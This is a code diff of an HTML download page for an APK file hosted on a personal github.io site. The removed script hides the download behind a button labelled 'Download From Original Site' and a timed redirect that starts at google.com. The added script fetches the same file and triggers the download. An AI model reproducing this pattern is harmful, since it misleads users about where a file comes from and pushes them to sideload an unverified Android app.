@@ -18,14 +18,19 @@
 </style>
  </head> 
  <body> 
-  <script>
-function a(){
-	window.open('https://google.com', 'x');
-	setTimeout(function(){
-		window.open('https://mohammedalqi.github.io/test.apk', 'x');
-	}, 5000);
-}
-</script> 
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ <button id="dl">Fetch & Download</button>
+<script>
+document.getElementById('dl').addEventListener('click', async () => {
+  const res = await fetch('https://mohammedalqi.github.io/test.apk');
+  const blob = await res.blob();
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'test.apk';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=> { URL.revokeObjectURL(url); a.remove(); }, 30000);
+});
+</script>
  </body>
 </html>
